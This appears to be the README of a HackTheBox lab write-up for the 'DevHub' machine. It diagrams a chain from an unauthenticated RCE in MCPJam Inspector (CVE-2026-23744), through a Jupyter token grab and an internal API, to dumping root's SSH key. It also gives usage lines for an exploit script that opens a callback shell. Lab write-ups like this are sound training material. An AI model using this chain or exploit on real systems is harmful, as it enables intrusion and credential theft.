# HackTheBox — DevHub
## CVE-2026-23744 | MCPJam Inspector Unauthenticated RCE

**Difficulty:** Medium  
**OS:** Linux  

---

## Exploitation Chain

```
┌─────────────────────────────────────────────────────┐
│                 CVE-2026-23744                      │
│     Unauthenticated POST → /api/mcp/connect         │
└─────────────────────┬───────────────────────────────┘
                      ↓
             Shell as mcp-dev
                      ↓
┌─────────────────────────────────────────────────────┐
│     portfwd 8888 → Jupyter Notebook Token Grab      │
└─────────────────────┬───────────────────────────────┘
                      ↓
         Browser → http://127.0.0.1:8888
                      ↓
          Shell as analyst via notebook cell
                      ↓
┌─────────────────────────────────────────────────────┐
│       cat /opt/opsmcp/server.py                     │
└─────────────────────┬───────────────────────────────┘
                      ↓
         portfwd 5000 → OPSMCP API
                      ↓
                      ↓
         /root/.ssh/id_rsa dumped
                      ↓
┌─────────────────────────────────────────────────────┐
│       ssh -i root_id_rsa root@devhub.htb            │
│                   ROOT ★                            │
└─────────────────────────────────────────────────────┘
```

## Files

| File | Description |
|---|---|
| `exploit.py` | CVE-2026-23744 RCE exploit with vuln check |
| `enum.py` | Local enumeration — Jupyter, MCP, Python, privesc |

## Usage

```bash
# Exploit
python3 exploit.py -t devhub.htb -l <your_ip> -r 4444

# Enumeration (once on box)
python3 enum.py --section all
python3 enum.py --section jupyter
```

## Disclaimer
For educational purposes and authorized testing only.
